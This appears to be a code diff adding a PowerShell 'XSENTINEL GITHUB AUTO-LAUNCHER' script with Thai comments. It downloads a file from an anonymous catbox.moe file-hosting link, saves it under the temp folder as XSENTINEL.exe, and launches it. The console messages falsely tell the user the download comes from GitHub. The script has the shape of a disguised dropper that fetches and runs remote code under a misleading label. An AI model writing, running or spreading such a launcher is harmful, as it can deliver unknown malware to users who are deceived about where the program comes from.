@@ -1,0 +1,28 @@
+
+$url = "https://files.catbox.moe/uab6n7.rar"
+$dest = "$env:TEMP\XSENTINEL.exe"
+
+
+[console]::beep(523, 150); [console]::beep(659, 150)
+
+Write-Host "--------------------------------------------" -ForegroundColor Cyan
+Write-Host "      XSENTINEL GITHUB AUTO-LAUNCHER        " -ForegroundColor White
+Write-Host "--------------------------------------------" -ForegroundColor Cyan
+
+try {
+    Write-Host "[>] Downloading XSENTINEL from GitHub..." -ForegroundColor Yellow
+    Invoke-WebRequest -Uri $url -OutFile $dest -ErrorAction Stop
+    
+    # เสียงแจ้งเตือนเมื่อโหลดเสร็จ (โด-มี-โซ)
+    [console]::beep(523, 150); [console]::beep(659, 150); [console]::beep(783, 150)
+    
+    Write-Host "[+] Download Complete!" -ForegroundColor Green
+    Write-Host "[!] Launching Program..." -ForegroundColor Cyan
+    
+    # 3. สั่งรันไฟล์
+    Start-Process -FilePath $dest
+}
+catch {
+    Write-Host "[X] Error: ไม่สามารถโหลดไฟล์ได้ ตรวจสอบลิงก์หรืออินเทอร์เน็ต" -ForegroundColor Red
+    [console]::beep(200, 500)
+}
